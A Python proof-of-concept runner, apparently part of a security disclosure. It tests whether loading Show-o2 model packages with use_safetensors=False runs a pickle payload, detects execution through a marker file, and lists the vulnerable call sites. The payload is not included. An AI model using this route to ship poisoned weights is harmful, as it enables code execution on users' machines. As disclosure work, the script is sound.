#!/usr/bin/env python
# run_poc.py - load one Show-o2 model package through the documented entry point
#
#   python run_poc.py showo2_evil_pkg         -> payload executes, model still loads
#   python run_poc.py showo2_st_control_pkg   -> same route, safetensors shard, nothing executes
#   python run_poc.py showo2_noindex_ctl      -> same poisoned bytes, no index, torch.load(weights_only=True)
#                                                rejects them on the direct route
#
# The documented entry point is Showo2Qwen2_5.from_pretrained(<path>, use_safetensors=False),
# as used by show-o2/inference_t2i.py:83, inference_mmu.py:70, inference_mixed_modality.py:75,
# inference_mmu_vid.py:72, train_stage_one.py:167, train_stage_two.py:168 and
# evaluation/inference_dpg.py:72 in showlab/Show-o @ 45a5a2de01d1.

import os
import sys
import warnings

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "Show-o-45a5a2de01d1", "show-o2"))

# Hide only the hundreds of harmless "copying from a non-meta parameter" UserWarnings
# that transformers emits while the product builds the model on the meta device.
# Security-relevant warnings (e.g. accelerate's torch.load weights_only FutureWarning) stay visible.
warnings.filterwarnings("ignore", message=".*copying from a non-meta parameter.*")

import torch
import transformers
import accelerate
import diffusers
from models.modeling_showo2_qwen2_5 import Showo2Qwen2_5  # noqa: E402

MARKER = os.path.join(HERE, "RCE_MARKER_SHOWO2_BIN_INDEX.txt")
B2_MARKER = "RCE_MARKER_B2_IMPORT.txt"


def main():
    if len(sys.argv) != 2:
        print(__doc__)
        return 2
    pkg = sys.argv[1]
    pdir = os.path.join(HERE, pkg)
    if not os.path.isdir(pdir):
        print("package not found: %s" % pkg)
        return 2

    print("package : %s" % pkg)
    print("python  : %s | torch %s | transformers %s | accelerate %s | diffusers %s"
          % (sys.version.split()[0], torch.__version__, transformers.__version__,
             accelerate.__version__, diffusers.__version__))
    if os.path.exists(MARKER):
        os.remove(MARKER)

    ok = True
    try:
        model = Showo2Qwen2_5.from_pretrained(pkg, use_safetensors=False)
        print("load    : SUCCESS -> %s on %s"
              % (type(model).__name__, next(model.parameters()).device))
    except Exception:
        ok = False
        print("load    : FAILED - exception chain below")
        import traceback
        traceback.print_exc()

    executed = os.path.exists(MARKER)
    print("marker  : %s" % ("PRESENT - payload executed during torch.load" if executed
                           else "absent - no code executed"))
    print("b2probe : %s" % ("evil_module.py WAS imported (unexpected)" if
                            os.path.exists(os.path.join(pdir, B2_MARKER))
                            else "evil_module.py never imported/executed"))
    print("verdict : %s" % (("RCE CONFIRMED via sharded index route" if ok and executed
                             else "clean load, no execution") if ok
                            else "payload rejected on this route"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
